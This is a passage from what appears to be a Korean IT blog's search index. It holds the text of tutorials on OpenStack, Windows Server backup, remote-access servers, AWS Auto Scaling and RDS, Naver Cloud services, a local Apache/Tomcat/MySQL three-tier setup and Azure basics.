주로 인증하며, Keystone에는 프로젝트, 사용자, 롤이 있음\n  관리자(admin, swiftoperator)는 사용자와 컨테이너를 생성, 삭제할 수 있음\n  관리자는 오브젝트도 올리기, 내려받기, 삭제를 할 수 있음\n  일반 사용자(member)은 사용자와 컨테이너를 생성할 수 없음\n  일반 사용자는 관리자가 미리 생성해서 권한을 준 컨테이너만 사용할 수 있음\n  일반 사용자는 관리자가 설정한 권한으로 오브젝트 목록을 확인할 수 있음\n  일반 사용자는 관리자가 설장한 권한으로 데이터를 올리고 내릴 수 있음\n  특정 사용자에게 관리자(admin) 권한을 부여하려면 리셀러어드민(ResellerAdmin) 롤을 주어야 함\n  해당 사용자는 관리자가 할 수 있는 기능을 모두 사용할 수 있음\n     Swift의 이레이저 코딩(Eraure Coding) 기능과 스토리지 정책    스토리지 저장 공간을 효율적으로 관리하는 것이 이레이져 코딩\n  다양한 물리 스토리지 디바이스를 정책별로 사용할 수 있게 지원하는 스토리지 정책(Storage Policy)기능이 있음\n  이레이져 코딩은 HDFS, RAID 외의 스토리지에서 데이터 저장 공간의 효율성을 높이려고 설계된 데이터 복제 방식\n  이레이져 코딩은 이레이져 코드를 사용해 데이터를 인코딩하고, 데이터가 손실되면 디코딩 과정을 거쳐 원본 데이터를 복구하는 기법 중 하나\n  이레이저 코드와 각 코드마다 사용하는 알고리즘은 다양한데 이런 알고리즘에 Reed-Solom on Code, Tahoe-Lafs, Weaver Code 등이 있음\n  스토리지 정책은 여러 오브젝트링을 생성해 다양한 목적으로 클러스터를 세그먼트화 할 수 있음\n  수정된 해시링을 통해 클러스터에서 데이터가 있어야 할 위치를 결정\n  이레이저 코드를 사용해 콜드 스토리지(Cold Storage: 저전력 스토리지)도 정의 할 수 있음\n    "}),a.add({id:133,href:'/docs/system/window/window08/',title:"백업과 복구",content:"Windows Server 백업과 복구   Windows Server의 백업 기능    사고는 언제나 발생할 수 있으며, 이러한 사고를 대비하기 위한 방편 중에서 반드시 해야할 것이 백업입니다.\n  기존의 폴더 또는 파일을 다른 안전한 장소에 보관하여 문제가 생길기 백업했던 데이터를 원래대로 복원혹은 복구가 가느하도록 합니다.\n  Windows Server에서는 자체적으로 백업 기능을 제공하며, 백업은 대체로 별도의 하드디스크나 다른 컴퓨터의 공유 폴더에 하는 것이 효과적입니다.\n  복구는 삭제된 일부 폴더만 복구할 수도 있으며, 볼륨 전체를 복구할 수도 있습니다.\n  Windows Serer 2012부턴느 ReFS 파일시스템의 백업도 지원합니다.\n     백업 실습   먼저 서버에 40 GB하드디스크를 추가후 일반 봄률으로 포맷시킵니다.       추가가 완료되면 프로그램 및 기능 \u0026gt; 기능 \u0026gt; Windows Server Backup을 설치합니다.         설치가 완료되면 제어판 \u0026gt; 시스템 및 보안 \u0026gt; 관리 도구를 선택합니다.\n  wbsadmin.msc로도 실행이 가능합니다.\n       Windows Server 백업을 선택합니다.        기본적으로 백업은 Azure(클라우드) 상에 백업하는 것을 추천하고 있으며, 여기서는 로컬에서 백업을 진행해보도록 하겠습니다.\n  우측의 한 번 백업을 클릭합니다.\n       전체 서버는 시간이 오래걸려 먼저 사용자 지정으로 진행하겠습니다.        백업할 항복을 선택해 완전 복구를 선택합니다.\n  실무에서는 필요에 따라 백업구역을 나눌 수 있습니다.\n       백업장소를 지정하여 진행합니다.        백업이 완료되었습니다.       ** 또한 정기적으로 백업을 설정할 수도 있습니다.**      복구 실습   복구를 테스트하기 위해 C:\\\\Program Files\\Common Files\\Services 폴더를 삭제합니다.       삭제 후 백업으로 돌아가 작업의 복구를 선택 후 백업 위치를 지정합니다.       백업 날짜를 지정합니다.        백업 대상을 지정합니다.\n  여기서는 Services 폴더 하나만 복구할 것이므로 파일 및 폴더를 선택합니다.\n       폴더를 선택하고 복구를 진행하면 폴더가 복구된 것을 확인하실 수 있습니다.        전체 백업과 증분 백업    전체 백업\n  불륨을 전부 백업하는 것\n  시간이 오래 걸리고 백업할 때마다 디스크 공간이 많이 필요\n       증분 백업\n  변경된 내용에 대해서만 백업\n  단, 증분 백업 또한 처음에는 무조건 전체 백업을 수행해야 하며 증분 백업 이후에는 시스템 성능이 약간 느려지는 단점이 있음\n  1회 전체 백업 외에는, 백업하는 속도가 상다히 빠름\n       증분 백업 실습   먼저 증분 백업을 위해 작업 \u0026gt; 성능 설정 구성을 선택하여 빠른 백업 성능을 선택합니다.       증분 백업 또한 한 번은 전체백업이 필요하기 때문에, 위와 동일하게 전체 백업을 진행합니다.        증분 백업 확인을 위해 적당한 사이즈의 폴더를 바탕화벽에 복사합니다.\n  저는 그냥 Services 폴더 하단의 VMware를 복사했습니다.\n       복사가 완료되면 작업 \u0026gt; 한 번 백업을 실행하여 백업 진행합니다.        백업이 완료되면 비교적 작은 데이터만 백업된 것을 확인하실 수 있습니다.      부팅이 안될 경우의 백업    실무에서는 드라이브가 심각하게 고장나서 부팅이 안될 경우에도 복구가 가능해야합니다.\n  이와 비슷한 환경으로 백업용 하드디스크를 새로운 컴퓨터에 옮기는 방법을 실습하여보겠습니다.\n  먼저 부팅이 되지 않게 하기 위해 FIRST 서버의 부팅하드를 삭제하겠습니다.\n        삭제 후에는 FIRST 서버에 동일하게 하드디스크를 추가합니다.\n  경우에 따라서는 다른 PC를 이용하셔도 무방합니다.\n  하드를 Windows 서버 설치와 동일하게 부팅합니다.\n       하지만 설치를 하지 않고 좌측하단에 Repair your computer를 선택합니다.       트러블 슈팅 \u0026gt; 이미지를 통한 복구를 선택하여 복구를 진행합니다.           복구가 완료되었습니다.\n  그림과 같이 부팅이 안될시에도 복구가 가능합니다.\n  실습은 Vmware에서 진행되었으나, 일반 PC에서도 동일한 방식으로 적용가능합니다.\n    "}),a.add({id:134,href:'/docs/aws/amazonwebservice/aws_analysis/',title:"AWS Analysis",content:"AWS Analysis   Amazon Athena       Amazon CloudSearch       Amazon EMR       Amazon ES       Amazon Kinesis       Amazon QuickSight       AWS DataPipeline      #\n"}),a.add({id:135,href:'/docs/aws/awstraining/as/',title:"AWS AutoScaling",content:"AWS AutoScaling    이번 장에서는 CloudComputing의 꽃이라고도 할 수 있는 AutoScaling 서비스를 구축해보겠습니다. AutoSacling의 대한 개념은 AutoScaling을 참조해주세요.    AWS AutoScaling ( 이하 As )      As 그룹 생성을 위해 AWS에 접속 합니다. 인스턴스를 생성하여, Apache가 자동시작되어있게 설정 후, AMI를 생성합니다. AMI 생성 참고      AMI 생성 후, As 그룹 생성을 위해 좌측의 메뉴에서 Auto Scaling \u0026gt; Auto Scaling 그룹 생성을 클릭합니다.      As그룹에서 시작하기를 클릭합니다.      내 AMI에서 생성한 AMI를 선택합니다.      AMI 선택이 완료되면 기본적인 시작 구성들을 입력합니다. 보안 그룹을 기존의 80번 포트가 열려있는 보안그룹을 사용했습니다.      기본 구성이 완료되면, 바로 As 그룹생성으로 이동됩니다. 그룹 생성에서 위의 그림과 VPC와 서브넷을 설정합니다. 여기서 시작구성에서 선택한 보안그룹과 선택한 보안그룹이 일치하지 않으면 에러가 발생합니다.      As 그룹생성에서 정책을 설정합니다.      평균 cpu의 사용이 5분간 30%이상이면 증가하는 정책을 생성합니다. 이와 동일하기 평균 cpu의 사용이 5분간 30%미만이면 삭제되는 정책을 생성합니다.      생성이 완료되면 As 보안그룹을 통해 인스턴스의 수, 최소, 최대 용량을 확인할 수 있습니다.      인스턴스가 생성된 것을 확인 할 수 있습니다.     $ apt -y update $ apt -y install stress $ stress -c 1  이제 As 확인을 위해 stress를 설치 후 작동시킵니다.      stress를 실행 후, 설정시간이 경과하면 인스턴스가 증가됨을 확인할 수 있습니다.      이와 같이 As를 통해 인스턴스를 정책에 따라 자동적으로 증가\u0026amp; 감소 시키는 것이 가능합니다. 또한 저번 장에서 구축했던 ELB에 As 그룹을 등록하면, 자동적으로 로드 밸런싱을 되어 유동적인 자원관리가 가능해집니다.     AWS CLI를 통한 생성  $ aws autoscaling create-launch-configuration \\ --launch-configuration-name launch-config-sample \\ --image-id [ AMI ID ] \\ --key-name [ key name ] \\ --no-ebs-optimized \\ --instance-type [ instance type ] \\ --instance-monitoring Enabled=true \\ --security-groups [ 보안그룹 ID ] \\ --associate-public-ip-address   As 주요 설정 파라미터\n    항목 이름 설명     Auto Sacling Group Name As 그룹명   Launch Configuration As 그룹에서 사용할 Launch Configuration   Load Balancers As 그룹에서 사용할 ELB   Desired As 그룹조건에 해당하지 않는 일반적인 인스턴스의 수   Min As 그룹에서 사용할 인스턴스의 최솟값   Max As 그룹에서 사용할 인스턴스의 최댓값   Health Check Type As 그룹에서 사용할 헬스 체크 판단 유형 ( EC2 or ELB )   Health Check Period As 그룹의 헬스 체크가 시작될 때 까지의 초   Termination Policies As 그룹에 속한 인스턴스의 삭제방침   Availability Zone As 그룹이 사용할 가용영역   Subnet As 그룹이 사용할 서브넷   Default Cooldown 스케일링 처리 후에 새로운 스케일링 처리를 받을 때 까지의 시간   Placemenet Group 낮은 레이턴시 ( Latency ) 환경과 논 블로킹 통신이 가능한 Placement Group을 선택   Suspended Processes 처리를 일시적으로 정지시킬 프로세스 목록 ( AWS CLI의 suspend-processes 명령어로 설정 )   Enabled Metrics CloudWatch 에서 활성화 되어 있는 매트릭스 목록         Scaling Policy 유형\n    유형 설명     ChangelnCapacity 그룹의 현재 용량을 지정한 수의 인스턴스만큼 늘리거나 줄입니다.   ExactCapacity 그룹의 현재 용량을 지정된 수의 인스턴스로 변경합니다.   PercentChangelnCapacity 그룹의 현재 용량을 지정된 비율만큼 늘리거나 줄입니다.         Scaling Policy의 주요 파라미터\n    항목 이름 설명     Scaling policy Name 이름 지정   Execute policy when 실행할 조건 ( CloudWatch의 Alram으로 설정 )   Take the action Auto Scaling Group의 목표 인스턴스 수를 설정   And than wait 다른 스케일링 처리가 실행되고 있을 때 대기할 시간     "}),a.add({id:136,href:'/docs/aws/awstraining/rds/',title:"AWS RDS 생성",content:"AWS RDS 생성    AWS RDS는 우리가 흔히 아는 Database ( Oracle db, Mysql, MariaDB )와 동일한 역할을 수행하지만, 보다 편리하고 안전하게 관리가 가능합니다. AWS RDS는 중요한 개념이므로, RDS에 대한 개념이 학습이 필요한 들은 AWS RDS를 참고해주세요.    AWS RDS 생성      먼저, RDS의 생성을 위해 AWS의 접속하여 RDS를 검색 후 클릭합니다.      데이터베이스 생성 -\u0026gt; 데이터베이스 생성을 클릭합니다.      여러 DB와 옵션을 사용할 수 있지만, 여기에서는 프리 티어 내에서 사용할 수 있도록 성정하도록 하겠습니다. 프리 티어의 체크 및 MySQL을 선택합니다.      RDS도 원리는 인스턴스에 DB가 설치된 것으로, CPU와 RAM이 존재합니다. DB 엔진 버전 : DB의 버전을 설정하는 옵션입니다. DB 인스턴스 클래스 : DB 인스턴스의 타입을 설정하는 옵션입니다. 다중 AZ 배포 : 서로 다른 가용영역에 배포하는 옵션 입니다. 스토리지 자동 조정 : DB의 용량이 할당된 용량을 초과하면, 자동적으로 스토리지의 량이 증가하게 할 수 있는 옵션입니다. DB 인스턴스 식별자 : RDS의 이름입니다. 마스터 사용자 이름 : RDS 접속 시 사용할 사용자입니다.      네트워크 및 보안 설정에서는 RDS가 생성될 VPC와 Subnet 및 퍼블릭 엑세스가 가능하게 할지 결정할 수 있습니다. 보안그룹은 기존 보안그룹을 사용해도 되지만, 여기서는 새로운 VPC 보안 그룹을 만들어 사용하겠습니다.      RDS 내의 DB의 이름 및 포트, 파라미터 그룹 등을 설정합니다.      RDS를 자동 백업 및 스냅샷에 대한 설정입니다. 읽기 복제본을 위해서는 설정이 되어있어야 합니다.      모니터링 서비스 및 발신 로그 유형을 선택합니다. 여기서는 선택하지 않습니다.      RDS의 유지관리 및 삭제방지의 대한 설정입니다. RDS는 자동적으로 업데이트가 가능하고, 삭제 방지의 대한 설정이 가능합니다.      RDS의 생성이 완료되면 RDS \u0026gt; 데이터베이스에서 확인이 가능합니다.      RDS에 접속을 위해 생성한 RDS를 클릭하여 연결\u0026amp;보인 \u0026gt; 보안그룹을 클릭하여 수정하겠습니다.      인 바운드 규칙을 그림과 같이 수정합니다. 혹은 접속한 동일 VPC의 서브넷의 IP대역으로 수정도 가능합니다.      이제 다시 RDS에 돌아와 파라미터 그룹을 생성 하겠습니다. 파라미터 그룹을 생성하는 그본 파라미터 그룹을 사용하면 한글 사용시 에러가 발생하기 때문입니다. 그림과 같이 파라미터 그룹 \u0026gt; 파라미터 그룹 생성을 클릭합니다.      파라미터 그룹을 생성합니다.      파라미터 그룹을 수정하기 위해 생성한 파라미터 그룹을 클릭 후, 편집을 진행합니다.      charcter을 검색 후, character-set-client-handshake, skip-character-set-client-handshake, validate_password_special_char_count를 제외한 모든 값을 utf8로 설정합니다. charcter과 동일하게 collation을 검색 후, collation_connection, collation_server의 값을 utf8_unicode-ci로 설정합니다.      파라미터 그룹이 생성되면, 다시 데이터베이스로 돌아와 수정을 클릭합니다.      데이터베이스 옵션에서 DB 파라미터 그룹을 생성한 파라미터 그룹으로 수정합니다.      즉시 적용을 선택합니다.      RDS가 수정중임을 확인할 수 있습니다.      수정이 완료되면, 생성한 RDS를 클릭하여 연결\u0026amp;보안에서 엔드포인트를 확인합니다.     $ apt -y install mysql-client  이후 동일한 VPC 내에서 인스턴스를 하나 생성해 mysql-client를 설치 후 접속을 진행합니다. mysql -u [ 생성시의 마스터 이름 ] -p -h [ RDS의 엔드포인트 ]를 통해 접속을 진행합니다. RDS 생성시에 설정한 DB로 접속이 가능함을 확인할 수 있습니다.   $ mysql\u0026gt; show variables like \u0026#39;c%\u0026#39;; # Variable 확인 $ mysql\u0026gt; set session [ Variable_name ]=[ 변경 값 ] # Variable 변경   위 처럼 직접변경 또한 가능합니다.    이것으로 기본적인 RDS에 대한 생성을 마치겠습니다. #  "}),a.add({id:137,href:'/docs/openstack/openstack/heat/',title:"Heat",content:"오케스트레이션 서비스 : Heat   Heat   Heat는 탬블릿과 Stack을 사용하여 자동으로 인스턴스의 리소스를 추가하거나 줄이는 서비스 오케스트레이션은 자원 관리, 배치, 정렬을 자동화하는 것 오케스트레이션은 인스턴스 생성에 대한 일련의 과정을 자동화해서 인프라를 쉽게 배포할 수 있도록 하는 탬플릿 기반 엔진 오케스트레이션에서 사용되는 템플릿 언어는 인프라, 서비스, 응용프로그램, 프로비저닝, 자동화 컴퓨팅, 스토리지, 네트워킹, 자동 스케일링 등에 사용 가능   Heat의 논리 아키텍처      구성요소 역할     heat-api RPC heat 엔진에 전송해서 요청된 API를 처리한 REST API를 제공   heat-api-cfn AWS CloudFormation과 호환되는 AWS 타입의 Query API를 제공   heat-engine 템플릿을 생성하고, Consumer(API를 사용하려고 접근하는 애플리케이션이나 서비스)를 다시 이벤트로 제공하는 오케스트레이션의 주 작업을 수행   queue 각 서비스들이 통신을 하기 위한 서비스      "}),a.add({id:138,href:'/docs/ncp/ncptraining/nca09/',title:"Naver Cloud Analytics",content:"Cloud Analytics    서비스와 관련된 다양한 로그를 수집하고 분석\n ELSA를 통해 모바일 앱에서 발생하는 크래시를 수집하고 분석    시스템의 다양한 로그를 수집하고 분석\n CLA를 통해 시스템의 로그를 수집하고 분석    웹 페이지에 대한 통계 분석\n RUA를 통해 웹 페이지의 방문자 통계를 확인      ELSA ( Effective Log Search \u0026amp; Analytics )    ELSA의 SDK/ API를 이용하여 어플리케이션을 쉽게 저장하고 검색, 분석할 수 있는 로그 분석 툴\n  특정 로그 발생시 알람을 보내는 이벤트 기능과 App Crash Report도 제공예정\n     CLA    시스템 로그 수집 분석 플랫폼\n  Agent(독자적) 기반으로 동작\n  Syslog, Apache Log, MySQL Log, Tomcat Log, Windows Event Log, MS-sQL error Log 수집\n  커스텀 로그 기능을 통해 직접 로그 대상 지정 가능\n  Object Storage와 연계되어 로그파일 보관 기능제공\n       RUA    웹페이지 접속자 분석 도구\n 구글 애널리특스와 유사한 상품으로 웹페이지 접속자에 대한 분석 통계       Cloud Hadoop   빅데이터 분석도구   하둡 클러스터를 보다 쉽고 편리하게 생성 및 관리\n  Apche Ambari를 제공하여 하둡 클러스터의 관리 및 모니터링을 효율적으로 사용\n       Cloud Search    사용자의 웹사이트에 검색 기능을 제공\n  다양한 인덱싱 구성 옵션 제공\n  다국어 및 분용어, 동의어 처리 기능 제공\n  네이버 형태소 분석 처리기를 기반으로 한국어 처리\n       Elasticsearch Service    Elasticsearch 클러스터를 손쉽게 배포, 보호, 운영 및 확장하여 로그분석, 검색, app 모니터링 등을 수행할 수 있또록 제공하는 완전 관리형 서비스\n Elasticsearch service 클러스터는 1대의 매니저 노드와 3대 이상의 데이터 노드로 구성 ( 데이터 노드 수는 설치 시 원하는 만큼 증성가능 ) Elasticsearch service는 데이터 분석 및 시각화 플랫폼인 Kibana와 연계되어 데이터를 빠르고 정확하게 분석가능       Global Region    네이버 클라우드 플랫폼 리전간 전용선 응답시간을 실시간으로 제공\n Link      "}),a.add({id:139,href:'/docs/openstack/',title:"OpenStack",content:""}),a.add({id:140,href:'/docs/system/window/window09/',title:"원격접속서버",content:"원격접속을 위한 TELNET Server, SSH Server   TELNET Server    TELNET 서버는 오랫동안 전통적으로 사용되어 온 원격 접속 서버로, 보안이 취약하지만 최근에는 보안 기능을 첨가하여 사용되어지고 있습니다.\n  기본적으로서버에 접속하기 이해서는 꼭 클라이언트 프로그램이 필요합니다.\n  서버 OS Windows라고 클라이언트 OS도 반드시 Windows일 필요는 없으며, 즉 서버의 OS와 클라이어트의 OS가 같을 할 필요는 없습니다.\n  Windows Server 2016부터는 내장된 TELNET 서버가 제거되어 직접 설치가 필요합니다.\n  또한 각각의 서버 프로그램은 자신에 맞는 별도의 클라이언트 프로그램이 필요합니다.\n     Server Client     웹 서버(IIS) 웹 클라이언트(Chrome, Internet Explorer, Safari, Firefox, Opera 등)   텔넷 서버 텔넷 클라이언트(telnet, Putty 등)   FTP 서버(IIS) FTP 클라이언트(알드라이브, wsFTP, ftp, gftp 등)   VNC 서버 VNC 클라이언트(vncviewer, TightVNC 등)   SQL 서버 SQL 클라이언트(SQL Server Management Studio, ODBC등)       TELNET Server 실습    먼저 FIRST의 TELNET SERVER을 설치합니다.\n  UserNamme을 설정하고 설치를 기본 값으로 진행합니다.\n         설치가 완료되면 컴퓨터 관리 \u0026gt; 서비스 \u0026gt; Pragma InetD에서 동작하는 것을 확인하실 수 있습니다.\n  보통 실행되기 전의 서버를 서버, 실행 된 후의 서버를 서비스라 합니다.\n         일반적으로 서버에 접속하기 위해서는 TELNET의 Port(23)번이 허용되었는 지를 방화벽에서 확인해야합니다.\n  이를 확인하기 위해서는 제아판 \u0026gt; Windows 방화벽 \u0026gt; Windows 방화벽을 통해 앱 또는 기능 허용 \u0026gt; Pragma ...에서 확인하실 수 있습니다.\n         다음으로는 클라이언트에서의 설치를 위해 WINCLIENT에 접속합니다.\n  접속 후 역할 및 기능 \u0026gt; 기능 \u0026gt; Telnet Client를 설치합니다.\n        설치가 완료되면 cmd를 실행하며 telnet 192.168.10.11(FIRST의 IP)를 입력합니다.\n  접속이 된 것을 확인하실 수 있습니다.\n         접속이 완료되면 mkdir C:\\Hello!를 입력하여 폴더를 생성합니다.       TELNET Server인 FIRTST의 C의 Hello! 서버가 생성된 것을 확인할 수 있습니다.      SSH 서버    Telnet과 용도는 동일하지만 보안이 강화\n  Windows Server는 SSH 서버를 포함하고 있지 않습니다.\n  SSH 서버의 원리는 Telnet과 거의 동일하지만, 데이터를 전송할 때 암호화를 한다는 점에서 다릅니다.\n     SSH Server 실습    FIRST 서버에 SSH Server를 설치합니다.\n  라이센스의 동의 후 개인적 사용용도로 설치합니다.\n          설치가 완료되면 설정을 위해 Open easy settings \u0026gt; Windows accoutss에서 계정을 생성합니다.\n  텔넷의 포트는 23이었지만, ssh는 22번 포트로 동작합니다.\n         설정이 완료되면 Start Server를 실행하여 서버를 실행합니다.       텔넷 서버와 동일하게 서비스 및 방화벽에서 실행을 확인할 수 있습니다.        WinClinet에서 SSH Clinet를 설치합니다.        IP와 포트번호 계정을 입력 후 접속합니다.        접속된 것을 확인하실 수 있습니다.\n  CD C:\\에 접속하시면 텔넷 서버에 접속해서 생성했던 Hello! 폴더를 확인하실 수 있습니다.\n      "}),a.add({id:141,href:'/docs/network/mail/mail-server/',title:"Mail Server",content:"Mail 서버 생성   단계  SSL 보안 인증서 발급받기  도메인 주소   메일서버 설치   Ubuntu 18.04\n   SSL 보안 인증서 발급받기  1. 도메인 주소 설정  SSL 보안 인증서를 사용하기 위해서는 http://도메인으로 해당 사이트에 접근이 가능해아합니다. 이미 도메인 주소가 있으신 분은 그것을 사용하고, 없으신 분은 Link에서 무료 도메인을 사용하시면 됩니다.   2. SSL  무료 SSL을 생성합니다.  $ sudo apt-get install -y postfix # postfix 설치    VMware에 NAS 설치   Vmware에서 Custom으로 Virtual Machine을 설치합니다.      14 혹은 15 버전을 선택 후 iso파일을 선택합니다. 파일이 없을시 Link에서 다운로드 합니다..      운영체제는 Linux에서 2.6.x Kernel 64-bit를 선택합니다.      Virtual Machine의 이름을 지정합니다.      코어 할당량을 지정합니다. ( 여기서는 빠른 설치를 위해 2/2개를 할당하였습니다. )      RAM을 할당을 지정합니다. ( 여기서는 빠른 설치를 위해 4G을 할당하였습니다.      접속의 편리를 위해 Nat로 선택합니다.      LSILogic으르 선택합니다.      SATA를 선택합니다.    Use an existing virtual disk를 선택 후, synoboot.vmdk를 임포트 시킵니다.      설정 창이 뜨면 기존 포맷을 유지시킵니다.      NAS를 실행시키기 전에 하드를 추가시킵니다. ( 여기서는 20G 하나만 추가시키겠습니다. )      실행 후, 1분이 경과하면 find.synology.com에 접속합니다.                                                                "}),a.add({id:142,href:'/docs/network/network/3tier/',title:"3Tier",content:"Local 3Tier 구현    OS, 구현 프로그램  Ubuntu18.04 Apache2 Tomcat8 Mysql5.8 GNS3   IP 대역  10.10.10.0/24 Public 20.20.20.0/24 Private 30.30.30.0/24 Private2  Public 대역 10.10.10.10 Apache1 10.10.10.11 Apache2  Private 대역 20.20.20.20 Tomcat1 20.20.20.21 Tomcat2  Public 대역 30.30.30.30 Mysql1 30.30.30.30 Mysql2     sudo vi /etc/netplan/50-cloud-init.yaml network: version: 2 ethernets: ens33: dhcp6: no addresses: - [ IP addresses ] gateway4: [ gateway ] nameservers: addresses: [ [nameserver] ] $ sudo netplan apply $ hostname -l 아키텍처 사진\n하단 부터 설치를 진행합니다.\n   Mysql 설치   30.30.30.30 Mysql1  $ sudo apt-get install -y mysql-server # mysql 설치 $ sudo mysql_secure_installation # mysql pw 설정 $ systemctl enable mysql # mysql 자동실행 등록  $ mysql\u0026gt; create database web; $ mysql\u0026gt; create table web.people(name varchar(100), age int); $ mysql\u0026gt; insert into web.people values(\u0026#39;kim\u0026#39;,20); $ mysql\u0026gt; insert into web.people values(\u0026#39;Lee\u0026#39;,10); $ mysql\u0026gt; insert into web.people values(\u0026#39;Hong\u0026#39;,17); $ mysql\u0026gt; select * from web.people; # 확인  연동 확인을 위한 데이터 삽입   $ mysql\u0026gt; create user \u0026#39;web\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;Dkagh1234.\u0026#39;; $ mysql\u0026gt; grant all privileges on web.* to \u0026#39;web\u0026#39;@\u0026#39;%\u0026#39;;   원격 접속을 위한 유저 생성   $ ufw allow 3306  방화벽 포트 등록   $ vi /etc/mysql/mysql.conf.d/mysqld.cnf bind-address = 127.0.0.1 -\u0026gt; tomcat IP  mysql 접속 허용 IP 설정     Tomcat8 설치  20.20.20.20 tomcat\n$ apt-get install -y lrzsz # JAVA 간편 다운로드를 위한 Irzsz 설치 $ apt-get install -y openjdk-8-jre $ apt-get install -y openjdk-8-jdk  JAVA 설치   $ which javac $ readlink -f /usr/bin/javac # 자바 위치 확인 $ vi /etc/profile export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 export PATH=$JAVA_HOME/bin/:$PATH export CLASS_PATH=$JAVA_HOME/lib/:$CLASS_PATH $ source /etc/profile $ echo $JAVA_HOME $ $JAVA_HOME/bin/javac -version  환경변수 등록 및 확인   $ apt-get install -y tomcat8 $ /usr/share/tomcat8/bin/version.sh # 톰캣 버전 확인 $ ufw allow 8080/tcp $ ufw allow 8009/tcp # 톰캣 방화벽 포트 설정 ( 8080은 추후에 삭제 및 8009는 각 설정 포트에 맞게 변경 ) $ systemctl enable tomcat8 # tomcat8 자동시작 등록  톰캣 설치   $ apt-get install -y libapache2-mod-jk # 연동 모듈 설치 $ vi /etc/tomcat8/server.xml \u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; # 주석 헤제 및 포트 변경  톰캣 연동 모듈 설치 및 설정   wget [ 다운로드 링크 ]  mysql-connector 다운로드 및 적용   $ vi /var/lib/tomcat8/webapps/ROOT/index.jsp \u0026lt;%@page import=\u0026#34;java.sql.*\u0026#34;%\u0026gt; \u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34;%\u0026gt; \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/loose.dtd\u0026#34;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Insert title here\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% Connection conn = null; ResultSet rs = null; String url = \u0026#34;jdbc:mysql://[ DB IP ]:3306/[ DB name ]?serverTimezone=UTC\u0026#34;; String id = \u0026#34;[ 원격 user ]\u0026#34;; String pwd = \u0026#34;[ 원격 pw ]\u0026#34;; try { Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;); conn = DriverManager.getConnection(url, id, pwd); Statement stmt = conn.createStatement(); String sql = \u0026#34;SELECT name, age FROM web.people\u0026#34;; rs = stmt.executeQuery(sql); while(rs.next()) { out.println(rs.getString(\u0026#34;name\u0026#34;)); out.println(rs.getString(\u0026#34;age\u0026#34;)); } conn.close(); } catch (Exception e) { e.printStackTrace(); }	%\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  DB 연동을 위한 jsp 파일 생성      Apache2 설치  10.10.10.10 Apache\n$ apt-get -y install apache2 # apache2 설치 $ systemctl enable apache2 # apache2 자동실행 등록 $ ufw allow 80/tcp # 방화벽 등록 $ apt-get install -y libapache2-mod-jk # tomcat 연동 모듈 설치  Apache2 설치 및 tomcat 연동 모듈 설치   $ vi /etc/apache2/workers.properties workers.tomcat_home=/usr/share/tomcat8 workers.java_home=/usr/lib/jvm/java-8-openjdk-amd64 worker.list=tomcat8 worker.tomcat8.port = 8009 worker.tomcat8.host = tomcat IP worker.tomcat8.type = ajp13 worker.tomcat8.lbfactor = 1  tomcat 워커 파일 등록   $ vi /etc/apache2/mods-available/jk.conf JkWorkersFile /etc/libapache2-mod-jk/workers.properties --\u0026gt; JkWorkersFile /etc/apache2/workers.properties  jk.conf 파일 수정   $ vi /etc/apache2/sites-available/000-default.conf DocumentRoot /var/www/html --\u0026gt; DocumentRoot /var/lib/tomcat8/webapps/ROOT JkMount /* tomcat8 # 추가 systemctl restart apache2  접근 디렉토리 수정    "}),a.add({id:143,href:'/docs/aws/awstraining/3tier/',title:"AWS 3Tier 구현",content:"****    ****          예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다.  \r\r\r "}),a.add({id:144,href:'/docs/azure/azuretraining/azure00/',title:"Az-900 : CloudComputing",content:"Az-900 : CloudComputing   클라우드 컴퓨팅    클라우드 컴퓨팅은 스토리지 공간이나 CPU 주기와 같은 리소스를 다른 회사의 컴퓨터에 대여하는 서비스이며 사용한 만큼의 요금만을 지불합니다.\n  클라우드 공급 기업은 작업을 싱행하는 데 필요한 실제 하드웨어와 이 하드웨어를 최신 상태로 유지할 책임이 존재하며, 제공되는 컴퓨팅 서비스는 클라우드 공급자에 따라 달라지며, 일반적으로는 하단의 항목이 기본적으로 포함됩니다.\n     Compute power : 리눅스 서버나 웹 프로그램\n  Storage : 저장 및 데이터베이스 역할\n  Networking : 클라우드 제공사와 우리 회사의 사이의 안전한 연결\n  Analytics : 이치 혹은 성능 데이터를 시각화\n     클라우드 컴퓨팅 서비스   클라우드 컴퓨팅의 목적은 소규모 신생 기업이든 대기업이든 상관없이 비즈니스를 보다 쉽고 효율적으로 운영할 수 있도록 만드는 것으로, 이러한 요구를 충족시키기 위해 클라우드 컴퓨팅 공급자는 광범위한 서비스를 제공합니다.     컴퓨팅 기능    이메일을 보내거나, 인터넷에서 예약을 하거나, 온라인으로 지불을 하거나, 심지어 Microsoft 학습 모듈을 사용할 때도 각 요청을 처리하고 응답을 반환하는 클아우드 기반 서버와 상호작용하게 되며, 기본적으로 인터넷을 구성하는 다양한 클라우드 공급 기업이 제공하는 컴퓨팅 서비스를 사용합니다.\n  클라우드 컴퓨팅을 사용하여 솔루션을 빌드하는 경우 리소스 및 요구 사항에 따라 작업을 수행하는 방법을 선택할 수 있습니다.\n  여기에서 컴퓨팅 기능의 종류에는 기본적으로 VM, 컨테이너, 서버리스 컴퓨팅으로 분리할 수 있습니다.\n   VM\n VM은 클라우드 기업의 물리적 서버에서 가상 머신을 생성하여 해당 서버를 직접 사용하여 생성하는 서비스입니다.       컨테이너   컨테이너는 애플리케이션에 일관적이고 격리된 